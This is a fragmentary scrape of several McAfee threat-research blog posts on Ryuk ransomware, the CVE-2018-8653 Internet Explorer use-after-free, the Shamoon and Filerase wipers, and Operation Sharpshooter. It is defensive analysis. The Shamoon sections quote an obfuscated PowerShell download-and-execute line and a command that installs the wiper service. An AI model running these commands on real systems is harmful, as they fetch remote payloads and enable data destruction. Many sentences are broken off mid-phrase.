 industries have been particularly susceptible to this discrepancy. Coveware has assisted at least 3 companies that have had to unwind their business when an affordable ransom amount, could not be reached. Typically, downtime costs are 10x the ransom amount, but in these industries downtime costs can be particularly extreme.
:\/:
 companies are of note as the size and number of their servers can make them appear like a large organization. Unfortunately, the business of hosting involves high fixed costs, low operating margins, and zero tolerance of downtime by end clients.  Hosting companies that get attacked typically have a few hours to restore service before their clients drop them for alternatives. Moreover, these companies suffer irreparable harm to their reputations, and may trigger SLA breaches that leave them exposed to liability.  The inability to pay a six-figure ransom has caused multiple hosting companies to shut down.
:\/:
 firms are also acutely exposed. These firms also present like larger firms given the volume of data they move and their network footprint. Additionally, attacks against 
:\/:
 firms can cause immediate supply chain issues for the victims’ end clients, who are subsequently forced to route through other service providers. Similar to IT Hosting, 
:\/:
 firms have low operating margins and end clients with little tolerance for service interruptions. The inability to pay or negotiate a large ransom has materially impacted several firms in this industry.
:\/:
When victims do pay the exorbitant ransom amount, the criminals will provide a decryptor to unlock a their files. This decryptor is actually framework that needs to be loaded with a victim’s private RSA key, provided by the criminals, in order to decrypt. Ensuring that the provided decryptor will only work for this specific victim. This setup allows the criminals to quickly load a victim’s key in the framework and offer a custom decryptor with minimal code change while the underlaying framework remains the same.
:\/:
From Coveware’s experience we have learned that the decryption process is quite cumbersome and full of possible fatal errors. Luckily Coveware was able to share the Ryuk decryptor with McAfee ATR in order to take a closer look at the issues and level of sophistication of the decryptor.
:\/:
Once launched the first thing the decryptor does is to search the HKEY_CURRENT_USER Hive for a value pair named “svchos” in the path “SOFTWARE\Microsoft\Windows\CurrentVersion\Run” and delete the specific entry. This removes the persistence of the malware. Afterwards it will reboot the system and remove any remaining Ryuk malware still receding on the system.
:\/:
Once rebooted the user needs to run the tool again and the decryptor will provide two options to decrypt.
:\/:
The fact that Ryuk ransomware adds HERMES filemarker string was already known, but discovering this specific check routine in the decryptor strengthens the hypotheses that Ryuk is a slightly modified version of Hermes2.1 ransomware kit that is sold online even more.
:\/:
While examining the decryptor we were astonished by the lack of sophistication and the amount of errors that resided within the code. Some of the most prominent issues were:
:\/:
If there is a quotation mark (“) in the file path the decryptor will report an error that it cannot find the specific file.
:\/:
The decryptor uses the “GetVersionExW” function to determine the windows version, from Windows 8.1. the value returned by this API has changed and the decryptor isn’t designed to handle this value.
:\/:
the .RYUK extension and replace it with the original extension. So, there is no way the name of the file can give an indication towards the type of the file, something that can be extremely labor intensive for enterprise victims.
:\/:
When choosing the manual option in the decryptor, the user has to supply a path of the specific file or choose “0” to finish. However, choosing a “0” will put the decryptor into an infinite loop.
:\/:
Looking at the decryptor, it is very worrisome to see that the criminals behind Ryuk can get away with such bad programming. It shows a clear lack of empathy towards their victims and the absence of solid coding skills. Victims who do pay the exorbitant ransom demand are far from in the clear. The decryptor offered by the criminals has a very high risk of malfunctioning, resulting in permanent damage to their precious files. Victims should always make an exact copy of the encrypted hard disk before trying to use the decryptor.
:\/:
By combining all the fresh insights with the information that was already discovered by ourselves and industry peers we can start defining our leading hypotheses around Ryuk. Based on this hypothesis, we will actively look for falsifying evidence. We encourage the security community to participate in this process. We realize that only by collaboration can we piece the different parts of the Ryuk puzzle together.
:\/:
Ryuk is a direct descendant from Hermes2.1 with slight modifications, based on the code overlap in the ransomware as well as the decryptor. Ryuk is not designed to be used in a largescale corporate environment, based on all the scalability issues in the decryptor. At this moment there are several actors or actor-groups spreading Ryuk, based on the extortion modus operandi and different communications with the victims. The actors or actor-groups behind Ryuk have a relationship with one of the Post-Soviet republics, based on the 
:\/:
 and the cultural references observed in the negotiations. The actors behind Ryuk most likely have an affiliation or 
:\/:
 and, based on their TTP, are better skilled at exploitation and lateral movement than pure Ransomware development.
:\/:
In the last seven months Ryuk has proven to be a highly profitable form of ransomware, despite the poor programming behind it and its decryptor. The criminals have proven to be ruthless and several of their victims were forced to wind down their businesses after they were unable to afford the exorbitant ransom.
:\/:
When a company does give in to the high demands it is extra painful to see a situation occur where they are permanently unable to recover their files due to the faulty decryptor.
:\/:
A solid data loss prevention strategy still remains the best advice against all forms of ransomware, for general prevention advice please visit

 a critical flaw in Internet Explorer’s scripting engine that could lead to remote code execution. The vulnerability is being exploited in the wild and was originally reported by a researcher from Google’s Threat Analysis Group. Microsoft released an out-of-band patch to fix the vulnerability before the normal patch cycle. McAfee products received an 
:\/:
A remote attacker can target Internet Explorer Versions 9 through 11 via a specially crafted website, while a local attacker on a rogue network could also target the Web Proxy Auto-Discovery service, which uses the same vulnerable scripting engine (jscript.dll). Microsoft Edge is not affected; however, other Windows applications that include the scripting engine might be vulnerable until the security patch from Microsoft is applied.
:\/:
Vulnerabilities targeting Internet Explorer that can be triggered either remotely or locally are prime tools for cybercriminals to compromise many unpatched computers. That is why criminals usually integrate those vulnerabilities into exploit kits, which propagate malware or conduct other nefarious activities against compromised hosts. The threat of exploit kits is one reason to track this type of vulnerability and to ensure all security patches are deployed in a timely manner. In 2018, more than 100 memory corruption vulnerabilities were found in a Microsoft scripting engine (either for Internet Explorer or Edge). See the

 for more details. (For defense-in-depth, products such as McAfee Endpoint Security or McAfee Host Intrusion Prevention can detect and eradicate such threats until patches can be applied.)
:\/:
 is released, cybercriminals can take as little as a few weeks (or in some cases days) to integrate it into their exploit kit. For example, 
:\/:
 was initially reported to Microsoft in late April by two teams of threat researchers who had observed its exploitation in the wild. Microsoft published an advisory within a week, in early May. Meanwhile, the researchers published their security analysis of the exploit. Only two weeks later a proof-of-concept exploit was 
:\/:
. In the next couple of weeks exploit kits RIG and Magnitude integrated their weaponized versions of the exploit. (A more detailed timeline can be found 
:\/:
It took less than a month for cybercriminals to weaponize the vulnerability initially disclosed by Microsoft; therefore, it is critical to understand the threat posed by these attack vectors, and to ensure counter measures are in place to stop the threat before it can do any damage.
:\/:
It is no surprise that exploitable bugs are becoming more exotic. This is the case for CVE 2018-8653, which takes three seemingly innocent behaviors and turns them into a use-after-free flaw. A Microsoft-specific extension triggers a rarely explored code path that eventually misbehaves and invokes a frequently used function with unusual arguments. This leads to the use-after-free condition that was exploited in the wild.
:\/:
The entry point for this vulnerability is a Microsoft-specific extension, the enumerator object. It offers an API to enumerate opaque objects that belong to the Windows world (mostly ActiveX components, such as a file system descriptor used to list drives on a system). However, it can also be called on a JavaScript array. In this situation, one can access the array member as usual, but objects created this way are stored slightly differently in memory. This is the cause of interesting side effects.
:\/:
The objects created by calling the Enumerator.prototype.item() function are recognized as an ActiveXObject and, as seen in the creation of eObj, we can under certain circumstances overwrite the “prototype” member that should have been a read-only property.
:\/:
The ability to overwrite the prototype member of an ActiveXObject can seem innocuous at first, but it can be leveraged to explore a code path that should not be reachable.
:\/:
When using the “instanceof” keyword, we can see that the right side of the keyword expects a function. However, with a specially crafted object, the instanceof call succeeds and, worse, we can control the code being executed.
:\/:
The edge case of invoking instanceof on a specially crafted ActiveXObject gives us the opportunity to run custom JavaScript code from a callback we control, which is typically an error-prone situation.
:\/:
 later in this document for more info), this bug can be turned into a “delete this” type of primitive, which resembles 
:\/:

When the callback function (“f” in our previous example) is invoked, the keyword “this” points to eObj.prototype. If we set it to null and then trigger a garbage collection, the memory backing the object can be freed and later reclaimed. However, as mentioned in the 
:\/:
Microsoft released an unscheduled patch to fix this vulnerability. It is common practice for us to look at what changed before and after the patch. Interestingly, this patch changes the strict minimum number of bytes, while the version number of the DLL remains unchanged.
:\/:
Using the popular diffing tool Diaphora, we compared the version of jscript.dll for Windows 10, x64-bit edition (feature version 1809).
:\/:
We can see that only a few functions were modified. All but one point to array-related functions. Those were probably patches addressing 
:\/:
 (jscript!JsArrayFunctionHeapSort out-of-bounds write). The only one remaining that was substantially modified is NameTbl::InvokeInternal.
:\/:
Diaphora provides us with a diff of the assembly code of the two versions of the function. In this instance, it is easier to compare the functions side by side in Ida Pro to see what has changed. A quick glance toward the end of the function shows the introduction of two calls to GCRoot::~GCRoot (the destructor of the object GCRoot).
:\/:
Looking at the implementation of ~GCRoot, we see it is the same code as that inlined in that function created by the compiler in the older version of the DLL.
:\/:
In the newer version of the DLL, this function is called twice; while in the unpatched version, the code was called only once (inlined by the compiler, hence the absence of a function call). In C++ parlance, ~GCRoot is the destructor of GCRoot, so we may want to find the constructor of GCRoot. An easy trick is to notice the magic offset 0x3D0 to see if this value is used anywhere else. We find it near the top of the same function (the unpatched version is on the left):
:\/:
Diving into the nitty gritty of garbage collection for jscript.dll is beyond the scope of this post, so let’s make some assumptions. In C++/C#, GCRoot would usually design a template to keep track of references pointing to the object being used, so those do not have garbage collection. Here it looks as though we are saving stack addresses (aka local variables) into a list of GCRoot objects to tell the garbage collector not to collect the objects whose pointers are on those specific locations on the stack. In hindsight this makes sense; we were able to “delete this” because “this” was not tracked by the garbage collector, so now Microsoft makes sure to specifically add that stack variable to the tracked elements.
:\/:
We can verify this hypothesis by tracing the code around an invocation of instanceof. It turns out that just before invoking our custom “isPrototypeOf” callback function, a call to NameTbl::GetVarThis stores a pointer in the newly “protected” stack variable and then invokes ScrFncObj::Call to execute our callback.
:\/:
Curious readers might wonder why it is possible to invoke instanceof on a custom object rather than on a function (as described previously). When instanceof is invoked in JavaScript, the CScriptRuntime::InstOf function is called behind the scene. Early on, the function distinguishes two cases. If the variable type is 0x81 (which seems to be a broad type for a JavaScript object on the heap), then it invokes a virtual function that returns true/false if the object can be called. On the other hand, if the type is not 0x81, a different path is followed; it tries to automatically resolve the prototype object and invoke isPrototypeOf.
:\/:
Now that we have seen the ins and outs of the bug, let’s look at a simple proof of concept that exhibits the use-after-free behavior.
:\/:
First, we set up a couple of arrays, so that everything that can be preallocated is allocated, and the heap is in a somewhat ready state for the use after free.
:\/:
For some reason, the objects array needs to be freed and garbage collected before the next step of the exploit. This could be due to some side effect of freeing the ActiveXObject. The memory is reclaimed when we assign “1” to the property reallocPropertyName. That variable is a magic string that will be copied over the recently freed memory to mimic legitimate variables. It is created as shown:
:\/:
The 0x0003 is a variable type that tells us the following value is an integer and that 1337 is its value. The string needs to be long enough to trigger an allocation of the same or similar size as the memory block that was recently freed.
:\/:
To summarize, JavaScript variables (here, the RegExp objects) are stored in a block; when all the variables from the block are freed, the block itself is freed. In the right circumstances, the newly allocated string can take the place of the recently freed block, and because “this” is still dangling in our callback, it can be used for some type confusion. (This is the method used by the attackers, but beyond the scope of this post.) In this example, the code will print 1337 instead of an empty RegExp.

CVE-2018-8653 targets multiple versions of Internet Explorer and other applications that rely on the same scripting engine. Attackers can execute arbitrary code on unpatched hosts from specifically crafted web pages or JavaScript files. Even though the bug was recently fixed by Microsoft, we can expect exploit kits to soon deploy a weaponized version of this critical vulnerability, leveraging it to target remaining unpatched systems. The technical analysis in this post should provide enough information for defenders to ensure their systems will withstand the threat and to know which primitives to look for as an entry point for the attack. McAfee security products can be leveraged to provide specific “virtual patching” for this threat until full software patches can be deployed, while current generic buffer overflow protection rules can be used to fingerprint exploit attempts against this and similar vulnerabilities.
:\/:
During the past week, an outbreak of Ryuk ransomware that impeded newspaper printing services in the United States has garnered a lot of attention. To determine who was behind the attack many have cited past research that compares code from Ryuk with the older ransomware Hermes to link the attack to North Korea. Determining attribution was largely based on the fact that the Hermes ransomware has been used in the past by North Korean actors, and code blocks in Ryuk are similar to those in Hermes.
:\/:
The McAfee Advanced Threat Research team has investigated this incident and determined how the malware works, how the attackers operate, and how to detect it. Based on the technical indicators, known cybercriminal characteristics, and evidence discovered on the dark web, our hypothesis is that the Ryuk attacks may not necessarily be backed by a nation-state, but rather share the hallmarks of a cybercrime operation.
:\/:
Attribution is a critical part of any cybercrime investigation. However, technical evidence is often not enough to positively identify who is behind an attack because it does not provide all the pieces of the puzzle. Artifacts do not all appear at once; a new piece of evidence unearthed years after an attack can shine a different light on an investigation and introduce new challenges to current assumptions.
:\/:
. We discovered the actors used a clever tactic to distract the IT staff: a ransomware outbreak timed for the same moment that the thieves were stealing money. We used the term 
:\/:
That was October 2017. Searching earlier events, we noticed a posting from August 2017 in an underground forum in which a Russian-speaking actor offered the malware kit Hermes 2.1 ransomware:
:\/:
What if the actor who attacked the Taiwanese bank simply bought a copy of Hermes and added it to the campaign to cause the distraction? Why go to the trouble to build something, when the actor can just buy the perfect distraction in an underground forum?
:\/:
 (“Hacker”) discussing the emergence of Ryuk and how it was first discovered by MalwareHunterTeam in August 2018. This first appearance came well before last week’s attack on newspaper printing services.
:\/:
Ryuk, according to Wikipedia, refers to a Japanese manga character from the series “Death Note.” Ryuk apparently drops a death note, a fitting name for ransomware that drops ransom notes.
:\/:
Ransomware is typically named by its cybercriminal developer, as opposed to the naming of state-sponsored malware, which is mostly is done by the security industry. It seems the criminals behind Ryuk are into manga.
:\/:
The use of manga character names and references is common in the cybercriminal scene. We often come across manga-inspired nicknames and avatars in underground forums.
:\/:
Looking at research from our industry peers comparing Ryuk and Hermes, we notice that the functionalities are generally equal. We agree that the actors behind Ryuk have access to the Hermes source code.
:\/:
Let’s dive a bit deeper into Ryuk and compare samples over the last couple of months regarding compilation times and the presence of program database (PDB) paths:
:\/:
We can see the PDB paths are almost identical. When we compare samples from August and December 2018 and focus on the checksum values of the executables’ rich headers, they are also identical.
:\/:
The author and seller of Hermes 2.1 emphasizes that he is selling is a kit and not a service. This suggests that a buyer of the kit must do some fine tuning by setting up a distribution method (spam, exploit kit, or RDP, for example) and infrastructure to make Hermes work effectively. If changing a name and ransom note are part of these tuning options, then it is likely that Ryuk is an altered version Hermes 2.1.
:\/:
In the race to determine who is behind an attack, research facts (the What and How questions) are often put aside to focus on attribution (the Who question). Who did it? This pursuit is understandable yet fundamentally flawed. Attribution is crucial, but there will always be unanswered questions. Our approach focuses on answering the What and How questions by analyzing the malware, the infrastructure involved, and the incident response performed at the victim’s site.
:\/:
Our approach is always to analyze competing hypotheses. When investigating an incident, we form several views and compare all the artifacts to support these hypotheses. We try not only to seek verifying evidence but also actively try to find evidence that falsifies a hypothesis. Keeping our eyes open for falsifying facts and constantly questioning our results are essential steps to avoid conformation bias. By following this method, we find the strongest hypothesis is not the one with the most verifying evidence, but the one with the least falsifying evidence.
:\/:
Examining competing hypotheses is a scientific approach to investigating cyber incidents. It may not help with the race to attribution, but it ensures the output is based on available evidence.
:\/:
 hypothesis in the Ryuk case is that of a cybercrime operation developed from a tool kit offered by a Russian-speaking actor. From the evidence, we see sample similarities over the past several months that indicate a tool kit is being used. The actors have targeted several sectors and have asked a high ransom, 500 Bitcoin. Who is responsible? We do not know. But we do know how the malware works, how the attackers operate, and how to detect the threat. That analysis is essential because it allows us to serve our customers.
:\/:
Last week the McAfee Advanced Threat Research team posted an analysis of a new wave of Shamoon “wiper” malware attacks that struck several companies in the Middle East and Europe. In that 
:\/:
 we discussed one difference to previous Shamoon campaigns. The latest version has a modular approach that allows the wiper to be used as a standalone threat.
:\/:
After further analysis of the three versions of Shamoon and based on the evidence we describe here, we conclude that the Iranian hacker group APT33—or a group masquerading as APT33—is likely responsible for these attacks.
:\/:
In the Shamoon attacks of 2016–2017, the adversaries used both the Shamoon Version 2 wiper and the wiper Stonedrill. In the 2018 attacks, we find the Shamoon Version 3 wiper as well as the wiper Filerase, first mentioned by 
:\/:
These new wiper samples (Filerase) differ from the Shamoon Version 3, which we analyzed last week. The latest Shamoon appears to be part of a toolkit with several modules. We identified the following modules:
:\/:
 Used to read a list of targeted computers created by the attackers. This tool is responsible to run the second tool, spreader.exe, with the list of each targeted machine.
:\/:
 Used to spread the file eraser in each machine previously set. It also gets information about the OS version.
:\/:
The attackers have essentially packaged an old version (V2) of Shamoon with an unsophisticated toolkit coded in .Net. This suggests that multiple developers have been involved in preparing the malware for this latest wave of attacks. In our last post, we observed that Shamoon is a modular wiper that can be used by other groups. With these recent attacks, this supposition seems to be confirmed. We have learned that the adversaries prepared months in advance for this attack, with the wiper execution as the goal.
:\/:
This post provides additional insight about the attack and a detailed analysis of the .Net tool kit.
:\/:
The motivation behind the attack is still unclear. Shamoon Version 1 attacked just two targets in the Middle East. Shamoon Version 2 attacked multiple targets in Saudi Arabia. Version 3 went after companies in the Middle East by using their suppliers in Europe, in a supply chain attack.
:\/:
These characters resemble the Arabic text تَبَّتْ يَدَا أَبِي لَهَبٍ وَتَبَّ. This is a phrase from the Quran (Surah Masad, Ayat 1 [111:1]) that means “perish the hands of the Father of flame” or “the power of Abu Lahab will perish, and he will perish.” What does this mean in the context of a cyber campaign targeting energy industries in the Middle East?
:\/:
We received intelligence that the adversaries had created websites closely resembling legitimate domains which carry job offerings. For example:
:\/:
Many of the URLs we discovered were related to the energy sector operating mostly in the Middle East. Some of these sites contained malicious HTML application files that execute other payloads. Other sites lured victims to login using their corporate credentials. This preliminary attack seems to have started by the end of August 2018, according to our telemetry, to gather these credentials.
:\/:
OoOVRmsXUQhNqZJTPOlkymqzsA.run(‘%windir%\\System32\\’ + FKeRGlzVvDMH + ‘ /c powershell -w 1 IEX (New-Object Net.WebClient)’+KoORGlpnUicmMHtWdp+’downloadstring’+KoORGlicmMHtWdp)

OoOVRmsXUQhNqZJTPOlkymqzsA.run(‘%windir%\\System32\\’ + FKeRGlzVvDMH + ‘ /c powershell -window hidden -enc
:\/:
The preceding script opens a command shell on the victim’s machine and downloads a PowerShell script from an external location. From another location, it loads a second file to execute.
:\/:
We discovered one of the PowerShell scripts. Part of the code shows they were harvesting usernames, passwords, and domains:
:\/:
The new wave of Shamoon is accompanied by a .Net tool kit that spreads Shamoon Version 3 and the wiper Filerase.
:\/:
This first component (OCLC.exe) reads two text files stored in two local directories. Directories “shutter” and “light” contain a list of targeted machines.
:\/:
OCLC.exe starts a new hidden command window process to run the second component, spreader.exe, which spreads the Shamoon variant and Filerase with the concatenated text file as parameter.
:\/:
The spreader component takes as a parameter the text file that contains the list of targeted machines and the Windows version. It first checks the Windows version of the targeted computers.
:\/:
It creates a folder on remote computers: C:\\Windows\System32\Program Files\Internet Explorer\Signing.
:\/:
It runs the executables on the remote machine by creating a batch file in the administrative share \\RemoteMachine\admin$\\process.bat. This file contains the path of the executables. The spreader then sets up the privileges to run the batch file.
:\/:
If anything fails, the malware creates the text file NotFound.txt, which contains the name of the machine and the OS version. This can be used by the attackers to track any issues in the spreading process.
:\/:
To spread the wipers, the attackers included an additional spreader using Psexec.exe, an administration tool used to remotely execute commands.
:\/:
The only difference is that this spreader uses psexec, which is supposed to be stored in Net2 on the spreading machine. It could be used on additional machines to move the malware further.
:\/:
In the 2017 wave of Shamoon attacks, we saw two wipers; we see a similar feature in the December 2018 attacks. Using the “tool kit” approach, the attackers can spread the wiper module through the victims’ networks. The wiper is not obfuscated and is written in .Net code, unlike the Shamoon Version 3 code, which is encrypted to mask its hidden features.
:\/:
Attributing this attack is difficult because we do not have all the pieces of the puzzle. We do see that this attack is in line with the Shamoon Version 2 techniques. Political statements have been a part of every Shamoon attack. In Version 1, the image of a burning American flag was used to overwrite the files. In Version 2, the picture of a drowned Syrian boy was used, with a hint of Yemeni Arabic, referring to the conflicts in Syria and Yemen. Now we see a verse from the Quran, which might indicate that the adversary is related to another Middle Eastern conflict and wants to make a statement.
:\/:
When we look at the tools, techniques, and procedures used during the multiple waves, and by matching the domains and tools used (as FireEye described in its 
:\/:
cmd.exe /c “ping -n 30 127.0.0.1 >nul && sc config MaintenaceSrv binpath= C:\windows\system32\MaintenaceSrv64.exe LocalService” && ping -n 10 127.0.0.1 >nul && sc start MaintenaceSrv
:\/:
 In this edition, we highlight the notable investigative research and trends in threats statistics and observations gathered by the McAfee Advanced Threat Research and McAfee Labs teams in Q3 of 2018.
:\/:
We are very excited to present to you new insights and a new format in this report. We are dedicated to listening to our customers to determine what you find important and how we can add value. In recent months we have gathered more threat intelligence, correlating and analyzing data to provide more useful insights into what is happening in the evolving threat landscape. McAfee is collaborating closely with MITRE Corporation in extending the techniques of its MITRE ATT&CK™ knowledge base, and we now include the model in our report. We are always working to refine our process and reports. You can expect more from us, and we welcome your feedback.
:\/:
As we dissect the threat landscape for Q3, some noticeable statistics jump out of the report.  In particular, the continued rise in cryptojacking, which has made an unexpected emergence over the course of a year. In Q3 the growth of coin miner malware returned to unprecedented levels after a temporary slowdown in Q2.
:\/:
Our analysis of recent threats included one notable introduction in a disturbing category. In Q3 we saw two new exploit kits: Fallout and Underminer. Fallout almost certainly had a bearing on the spread of GandCrab, the leading ransomware. Five years ago we published the report “Cybercrime Exposed,” which detailed the rise of cybercrime as a service. Exploit kits are the epitome of this economy, affording anyone the opportunity to easily and cheaply enter the digital crime business.
:\/:
New malware samples jumped up again in Q3 after a decline during the last two quarters. Although the upward trend applies to almost every category, we did measure a decline in new mobile malware samples following three quarters of continual growth.
:\/:
Destructive malware has been employed by adversaries for years. Usually such attacks are carefully targeted and can be motivated by ideology, politics, or even financial aims.
:\/:
Destructive attacks have a critical impact on businesses, causing the loss of data or crippling business operations. When a company is impacted, the damage can be significant. Restoration can take weeks or months, while resulting in unprofitability and diminished reputation.
:\/:
Recent attacks have demonstrated how big the damage can be. Last year NotPetya affected several companies around the world. Last February, researchers uncovered OlympicDestroyer, which affected the Olympic Games organization.
:\/:
Shamoon is destructive malware that McAfee has been monitoring since its appearance. The most recent wave struck early this month when the McAfee Foundstone Emergency Incident Response team reacted to a customer’s breach and identified the latest variant. Shamoon hit oil and gas companies in the Middle East in 2012 and resurfaced in 2016 targeting the same industry. This threat is critical for businesses; we recommend taking appropriate actions to defend your organizations.
:\/:
During the past week, we have observed a new variant attacking several sectors, including oil, gas, energy, telecom, and government organizations in the Middle East and southern Europe.
:\/:
Similar to the previous wave, Shamoon Version 3 uses several mechanisms as evasion techniques to bypass security as well to circumvent analysis and achieve its ends. However, its overall behavior remains the same as in previous versions, rendering detection straightforward for most antimalware engines.
:\/:
As in previous variants, Shamoon Version 3 installs a malicious service that runs the wiper component. Once the wiper is running, it overwrites all files with random rubbish and triggers a reboot, resulting in a “blue screen of death” or a driver error and making the system inoperable. The variant can also enumerate the local network, but in this case does nothing with that information. This variant has some bugs, suggesting the possibility that this version is a beta or test phase.
:\/:
The main differences from earlier versions are the name list used to drop the malicious file and the fabricated service name MaintenaceSrv (with “maintenance” misspelled). The wiping component has also been designed to target all files on the system with these options:
:\/:
Shamoon is modular malware: The wiper component can be reused as a standalone file and weaponized in other attacks, making this threat a high risk. The post presents our findings, including a detailed analysis and indicators of compromise.
:\/:
Shamoon is a dropper that carries three resources. The dropper is responsible for collecting data as well as embedding evasion techniques such as obfuscation, antidebugging, or antiforensic tricks. The dropper requires an argument to run.
:\/:
It decrypts the three resources and installs them on the system in the %System% folder. It also creates the service MaintenaceSrv, which runs the wiper. The typo in the service name eases detection.
:\/:
The Advanced Threat Research team has watched this service evolve over the years. The following tables highlight the differences:
:\/:

The wiper uses ElRawDisk.sys to access the user’s raw disk and overwrites all data in all folders and disk sectors, causing a critical state of the infected machine before it finally reboots.
:\/:
Shamoon 2018 needs an argument to run and infect machines. It decrypts several strings in memory that gather information on the system and determine whether to drop the 32-bit or 64-bit version.
:\/:
It also drops the file key8854321.pub (MD5: 41f8cd9ac3fb6b1771177e5770537518) in the folder c:\Windows\Temp\key8854321.pub.
:\/:
Shamoon enables the service RemoteRegistry, which allows a program to remotely modify the registry. It also 
:\/:
It then retrieves the resources within the PE file to drop the components. Finding the location of the resource:
:\/:
Shamoon creates the file and sets the time to August 2012 as an antiforensic trick. It puts this date on any file it can destroy.
:\/:
The modification time can be used as an antiforensic trick to bypass detection based on the timeline, for example. We also observed that in some cases the date is briefly modified on the system, faking the date of each file. The files dropped on the system are stored in C:\\Windows\System32\.
:\/:
Before creating the malicious service, Shamoon elevates its privilege by impersonating the token. It first uses LogonUser and ImpersonateLoggedOnUser, then ImpersonateNamedPipeClient. Metasploit uses a similar technique to elevate privileges.
:\/:
Elevating privileges is critical for malware to perform additional system modifications, which are usually restricted.
:\/:
Shamoon creates the new malicious service MaintenaceSrv. It creates the service with the option Autostart (StartType: 2) and runs the service with its own process (ServiceType: 0x10):
:\/:
If the service is already created, it changes the configuration parameter of the service with the previous configuration.
:\/:
The wiper component is dropped into the System32 folder. It takes one parameter to run. The wiper driver is embedded in its resources.
:\/:
The malware overwrites every file in c:\Windows\System32, placing the machine in a critical state. All the files on the system are overwritten.
:\/:
The worm component is extracted from the resources from the dropper. Destructive malware usually uses spreading techniques to infect machines as quickly as possible.
:\/:
Although the worm component can spread the dropper and connect to a remote server, the component was not used in this version.
:\/:
Aside from the major destruction this malware can cause, the wiper component can be used independently from the dropper. The wiper does not have to rely on the main stub process. The 2018 Shamoon variant’s functionality indicates modular development. This enables the wiper to be used by malware droppers other than Shamoon.
:\/:
Shamoon is showing signs of evolution; however, these advancements did not escape detection by McAfee DATs. We expect to see additional attacks in the Middle East (and beyond) by these adversaries. We will continue to monitor our telemetry and will update this analysis as we learn more.
:\/:
The McAfee Advanced Threat Research team and McAfee Labs Malware Operations Group have discovered a new global campaign targeting nuclear, defense, energy, and financial companies, based on McAfee® Global Threat Intelligence. This campaign, Operation Sharpshooter, leverages an in-memory implant to download and retrieve a second-stage implant—which we call Rising Sun—for further exploitation. According to our analysis, the Rising Sun implant uses source code from the Lazarus Group’s 2015 backdoor 
:\/:
Operation Sharpshooter’s numerous technical links to the Lazarus Group seem too obvious to immediately draw the conclusion that they are responsible for the attacks, and instead indicate a potential for false flags. Our research focuses on how this actor operates, the global impact, and how to detect the attack. We shall leave attribution to the broader security community.
:\/:
This campaign, while masquerading as legitimate industry job recruitment activity, gathers information to monitor for potential exploitation. Our analysis also indicates similar techniques associated with other job recruitment campaigns.
:\/:
In October and November 2018, the Rising Sun implant has appeared in 87 organizations across the globe, predominantly in the United States, based on McAfee telemetry and our analysis. Based on other campaigns with similar behavior, most of the targeted organizations are English speaking or have an English-speaking regional office. This actor has used recruiting as a lure to collect information about targeted individuals of interest or organizations that manage data related to the industries of interest. The McAfee Advanced Threat Research team has observed that the majority of targets were defense and government-related organizations.
:\/:

:\/:
Infection flow of the Rising Sun implant, which eventually sends data to the attacker’s control servers. 
:\/:
Our discovery of this new, high-function implant is another example of how targeted attacks attempt to gain intelligence. The malware moves in several steps. The initial attack vector is a document that contains a weaponized macro to download the next stage, which runs in memory and gathers intelligence. The victim’s data is sent to a control server for monitoring by the actors, who then determine the next steps.
:\/:
We have not previously observed this implant. Based on our telemetry, we discovered that multiple victims from different industry sectors around the world have reported these indicators.
:\/:
Was this attack just a first-stage reconnaissance operation, or will there be more? We will continue to monitor this campaign and will report further when we or others in the security industry receive more information. The McAfee Advanced Threat Research team encourages our peers to share their insights and attribution of who is responsible for Operation Sharpshooter.

These predictions were written by Eoin Carroll, Taylor Dunton, John Fokker, German Lancioni, Lee Munson, Yukihiro Okutomi, Thomas Roccia, Raj Samani, Sekhar Sarukkai, Dan Sommer, and Carl Woodward.
:\/:
As 2018 draws to a close, we should perhaps be grateful that the year has not been entirely dominated by 
:\/:
, although the rise of the GandCrab and SamSam variants show that the threat remains active. Our predictions for 2019 move away from simply providing an assessment on the rise or fall of a particular threat, and instead focus on current rumblings we see in the cybercriminal underground that we expect to grow into trends and subsequently threats in the wild.
:\/:
We have witnessed greater collaboration among cybercriminals exploiting the underground market, which has allowed them to develop efficiencies in their products. Cybercriminals have been partnering in this way for years; in 2019 this market economy will only expand. The game of cat and mouse the security industry plays with ransomware developers will escalate, and the industry will need to respond more quickly and effectively than ever before.
:\/:
Social media has been a part of our lives for more than a decade. Recently, nation-states have infamously used social media platforms to spread misinformation. In 2019, we expect criminals to begin leveraging those tactics for their own gain. Equally, the continued growth of the Internet of Things in the home will inspire criminals to target those devices for monetary gain.
:\/:
One thing is certain: Our dependency on technology has become ubiquitous. Consider the breaches of identity platforms, with reports of 50 million users being affected. It is no longer the case that a breach is limited to that platform. Everything is connected, and you are only as strong as your weakest link. In the future, we face the question of which of our weakest links will be compromised.
:\/:
Hidden hacker forums and chat groups serve as a market for cybercriminals, who can buy malware, exploits, botnets, and other shady services. With these off-the-shelf products, criminals of varying experience and sophistication can easily launch attacks. In 2019, we predict the underground will consolidate, creating fewer but stronger malware-as-a-service families that will actively work together. These increasingly powerful brands will drive more sophisticated cryptocurrency mining, rapid exploitation of new vulnerabilities, and increases in mobile malware and stolen credit cards and credentials.
:\/:
We expect more affiliates to join the biggest families, due to the ease of operation and strategic alliances with other essential top-level services, including exploit kits, crypter services, Bitcoin mixers, and counter-antimalware services. Two years ago, we saw many of the largest ransomware families, for example, employ affiliate structures. We still see numerous types of 
:\/:
 pop up, but only a few survive because most cannot attract enough business to compete with the strong brands, which offer higher infection rates as well as operational and financial security. At the moment the largest families actively advertise their goods; business is flourishing because they are strong brands 
:\/:
Underground businesses function successfully because they are part of a trust-based system. This may not be a case of “honor among thieves,” yet criminals appear to feel safe, trusting they cannot be touched in the inner circle of their forums. We have seen this trust in the past, for example, with the popular credit card shops in the first decade of the century, which were a leading source of cybercrime until major police action broke the trust model.
:\/:
As endpoint detection grows stronger, the vulnerable remote desktop protocol (RDP) offers another path for cybercriminals. In 2019 we predict malware, specifically ransomware, will increasingly use RDP as an entry point for an infection. Currently, most underground shops 
:\/:
 for purposes other than ransomware, typically using it as a stepping stone to gain access to Amazon accounts or as a proxy to steal credit cards. Targeted ransomware groups and ransomware-as-a-service (RaaS) models will take advantage of RDP, and we have seen highly successful under-the-radar schemes use this tactic. Attackers find a system with weak RDP, attack it with ransomware, and propagate through networks either living off the land or using worm functionality 
:\/:
We also expect malware related to cryptocurrency mining will become more sophisticated, selecting which currency to mine on a victim’s machine based on the processing hardware 
:\/:
Next year, we predict the length of a vulnerability’s life, from detection to weaponization, will grow even shorter. We have noticed a trend of cybercriminals becoming more agile in their development process. They gather data on flaws from online forums and the Common Vulnerabilities and Exposures database to add to their malware. We predict that criminals will sometimes take a day or only hours to implement attacks against the latest weaknesses in software and hardware.
:\/:
